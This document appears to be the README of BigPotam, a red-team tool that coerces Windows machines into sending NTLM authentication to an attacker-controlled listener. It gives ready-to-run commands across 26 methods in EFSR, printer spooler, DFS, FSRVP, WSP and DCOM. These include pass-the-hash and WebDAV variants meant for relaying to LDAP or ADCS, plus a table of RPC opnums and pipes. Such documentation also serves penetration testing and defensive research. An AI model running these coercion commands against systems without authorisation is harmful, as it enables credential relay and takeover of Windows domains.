# BigPotam

Unified NTLM authentication coercion tool. Consolidates 26 coercion methods across 8 Windows protocols into a single tool with stop-on-first-success behavior.

## Quick Start

```bash
# Install
pip install impacket

# Basic usage — stops on first successful coercion
python3 bigpotam.py domain/user:password@target 10.0.0.5
```

## Usage

### Common Scenarios

```bash
# Try all methods (enumerate everything, don't stop on first hit)
python3 bigpotam.py domain/user:password@target 10.0.0.5 -all

# Target a specific protocol
python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR

# Target a specific method
python3 bigpotam.py domain/user:password@target 10.0.0.5 -method EfsRpcEncryptFileSrv
```

### WebDAV Coercion

Use `-listener-port` to force WebDAV paths (`\\host@port/path`). This triggers auth through the WebClient service on HTTP instead of SMB, useful for relaying to LDAP/ADCS or when port 445 is blocked.

```bash
# WebDAV on port 80 (all protocols that support it)
python3 bigpotam.py domain/user:password@target 10.0.0.5 -listener-port 80

# WebDAV on a custom port (e.g. 8080) with EFSR via efsrpc pipe
python3 bigpotam.py domain/user:password@target 10.0.0.5 -listener-port 8080 -protocol MS-EFSR -pipe efsrpc

# WebDAV with all methods — useful for finding what works
python3 bigpotam.py domain/user:password@target 10.0.0.5 -listener-port 80 -all
```

The `-listener-port` flag automatically formats the UNC path for each protocol (e.g. `\\listener@8080/abc\share\file.txt` for EFSR). You don't need to manually construct WebDAV paths like in PetitPotam.

### EFSR Transport Options

```bash
# Try all EFSR named pipes (lsarpc, efsrpc, samr, lsass, netlogon)
python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR -all-pipes

# Direct TCP EFSRPC (bypasses SMB named pipes entirely)
python3 bigpotam.py domain/user:password@target 10.0.0.5 -protocol MS-EFSR -pipe tcp_efsr -tcp-port 49664
```

### Authentication

```bash
# Pass-the-hash
python3 bigpotam.py domain/user@target 10.0.0.5 -hashes :aad3b435b51404eeaad3b435b51404ee

# Kerberos
python3 bigpotam.py domain/user@target 10.0.0.5 -k -dc-ip 10.0.0.1

# No password prompt (useful with -k)
python3 bigpotam.py domain/user@target 10.0.0.5 -k -no-pass -dc-ip 10.0.0.1
```

### Debugging

```bash
# Timestamps + verbose debug output
python3 bigpotam.py domain/user:password@target 10.0.0.5 -ts -debug
```

## Arguments

```
positional:
  target              [[domain/]username[:password]@]<host>
  listener            IP or hostname for auth callback

coercion:
  -listener-port      Listener port (default: 445, use 80 for WebDAV)
  -method             Specific method name (e.g. EfsRpcEncryptFileSrv)
  -protocol           Limit to one protocol
  -all                Try all methods even after first success
  -all-pipes          Try all EFSR transports per method
  -pipe               MS-EFSR pipe/transport override
  -tcp-port           RPC TCP port for EFSR tcp_* transports (from rpcdump)

authentication:
  -hashes             LMHASH:NTHASH
  -no-pass            Skip password prompt
  -k                  Kerberos authentication
  -dc-ip              Domain controller IP

connection:
  -target-ip          Target IP if different from hostname
  -port               SMB port (139 or 445, default 445)
  -timeout            Connection timeout in seconds (default 5)

output:
  -ts                 Add timestamps
  -debug              Verbose debug output
```

## Protocols & Methods

26 methods across 8 protocols:

| Protocol | Count | Pipe / Transport | WebDAV |
|----------|-------|------------------|--------|
| MS-EFSR  | 11    | lsarpc, efsrpc, samr, lsass, netlogon, tcp_lsarpc, tcp_efsr | Yes |
| MS-RPRN  | 3     | spoolss / dcerpc (EPM) | Yes |
| MS-PAR   | 1     | spoolss | No |
| MS-DFSNM | 6     | netdfs | Partial |
| MS-FSRVP | 2     | FssagentRpc | Yes |
| MS-EVEN  | 1     | eventlog | No |
| MS-WSP   | 1     | MsFteWds (binary SMB pipe) | No |
| DCOM     | 1     | port 135 (DCOM) | No |

### Method Reference

| # | Protocol | Method | Opnum | Pipe | Notes |
|---|----------|--------|-------|------|-------|
| 1 | MS-EFSR | EfsRpcEncryptFileSrv | 4 | lsarpc/efsrpc/tcp_* | |
| 2 | MS-EFSR | EfsRpcDecryptFileSrv | 5 | lsarpc/efsrpc/tcp_* | |
| 3 | MS-EFSR | EfsRpcQueryUsersOnFile | 6 | lsarpc/efsrpc/tcp_* | |
| 4 | MS-EFSR | EfsRpcQueryRecoveryAgents | 7 | lsarpc/efsrpc/tcp_* | |
| 5 | MS-EFSR | EfsRpcRemoveUsersFromFile | 8 | lsarpc/efsrpc/tcp_* | |
| 6 | MS-EFSR | EfsRpcAddUsersToFile | 9 | lsarpc/efsrpc/tcp_* | |
| 7 | MS-EFSR | EfsRpcFileKeyInfo | 12 | lsarpc/efsrpc/tcp_* | |
| 8 | MS-EFSR | EfsRpcDuplicateEncryptionInfoFile | 13 | lsarpc/efsrpc/tcp_* | |
| 9 | MS-EFSR | EfsRpcAddUsersToFileEx | 15 | lsarpc/efsrpc/tcp_* | |
| 10 | MS-EFSR | EfsRpcFileKeyInfoEx | 16 | lsarpc/efsrpc/tcp_* | |
| 11 | MS-EFSR | EfsRpcOpenFileRaw | 0 | lsarpc/efsrpc/tcp_* | Patched on most targets |
| 12 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotification | 62 | spoolss | PrinterBug |
| 13 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx | 65 | spoolss | |
| 14 | MS-RPRN | RpcRemoteFindFirstPrinterChangeNotificationEx | 65 | dcerpc (EPM) | Dynamic TCP endpoint |
| 15 | MS-PAR | RpcAsyncOpenPrinter | 0 | spoolss | |
| 16 | MS-DFSNM | NetrDfsAddStdRoot | 12 | netdfs | |
| 17 | MS-DFSNM | NetrDfsAddStdRootForced | 15 | netdfs | SMB only |
| 18 | MS-DFSNM | NetrDfsAddRootTarget | 23 | netdfs | SMB only |
| 19 | MS-DFSNM | NetrDfsRemoveRootTarget | 24 | netdfs | SMB only |
| 20 | MS-DFSNM | NetrDfsRemoveStdRoot | 13 | netdfs | |
| 21 | MS-DFSNM | NetrDfsManagerInitialize | 14 | netdfs | SMB only |
| 22 | MS-FSRVP | IsPathSupported | 8 | FssagentRpc | ShadowCoerce |
| 23 | MS-FSRVP | IsPathShadowCopied | 9 | FssagentRpc | ShadowCoerce |
| 24 | MS-EVEN | ElfrOpenBELW | 9 | eventlog | SMB only, device path |
| 25 | MS-WSP | WSP Connect/Query | -- | MsFteWds | Binary protocol, not DCE/RPC |
| 26 | DCOM | UpdateSession.AddScanPackageService | -- | port 135 | Machine account coercion |

## Execution Order

Default mode (stop-on-first-success) tries methods in this order:

1. **MS-EFSR** via lsarpc/efsrpc -- 11 functions, with optional direct TCP
2. **MS-RPRN** via spoolss -- PrinterBug (opnum 62 and 65)
3. **MS-RPRN** via EPM/TCP -- dynamic endpoint when spoolss pipe is blocked
4. **MS-PAR** -- RpcAsyncOpenPrinter
5. **MS-DFSNM** -- 6 DFS namespace functions
6. **MS-FSRVP** -- ShadowCoerce (IsPathSupported, IsPathShadowCopied)
7. **MS-EVEN** -- ElfrOpenBELW with device path format
8. **MS-WSP** -- Windows Search (workstations only, disabled on servers since 2016)
9. **DCOM** -- UpdateSession (machine account, port 135/DCOM)

## How It Works

- **EFS auto-activation**: Probes `\PIPE\efsrpc` and `\PIPE\lsarpc` over SMB first, then falls back to EPM/135 to wake up the EFS service before attempting EFSR coercion
- **Stop on first success**: Default behavior -- use `-all` to enumerate everything
- **WebDAV support**: `-listener-port 80` generates `\\host@80/path` UNC paths for WebClient coercion
- **Per-method error checking**: Each protocol checks specific Windows error codes (ERROR_BAD_NETPATH, rpc_s_access_denied, etc.) rather than catching all exceptions
- **Failed pipe tracking**: Skips pipes that already failed to connect
- **Protocol-correct paths**: Each protocol uses its exact required format (device paths for MS-EVEN, `file://` URIs for MS-WSP, random shares for DCOM)

## Protocol Notes

- **MS-EVEN** uses `\\??\UNC\` device path format, not a standard UNC path
- **MS-WSP** uses `file:////listener/share` with forward slashes, binary protocol over SMB (not DCE/RPC)
- **DCOM UpdateSession** connects via port 135/DCOM, not named pipes -- coerces the **machine account**, not a user session
- **MS-RPRN** requires an `RpcOpenPrinter` handle before calling notification functions
- **EFSR UUID varies by transport**: `efsrpc` and `tcp_efsr` use `df1941c5-...`, all others use `c681d488-...`

## Credits

Built on research and code from:

- [PetitPotam](https://github.com/topotam/PetitPotam) by topotam
- [PetitPotam](https://github.com/ly4k/PetitPotam) by ly4k
- [Coercer](https://github.com/p0dalirius/Coercer) by p0dalirius
- [NetExec coerce_plus](https://github.com/Pennyw0rth/NetExec) by Pennyw0rth
- [windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) by p0dalirius
- [wspcoerce](https://github.com/RedTeamPentesting/wspcoerce) by RedTeam Pentesting
- [RemoteMonologue](https://github.com/xforcered/RemoteMonologue) by xforcered
- SpoolSample by Lee Christensen (@tifkin_)
- PrinterBug by Dirk-jan Mollema
- DFSCoerce, ShadowCoerce community research
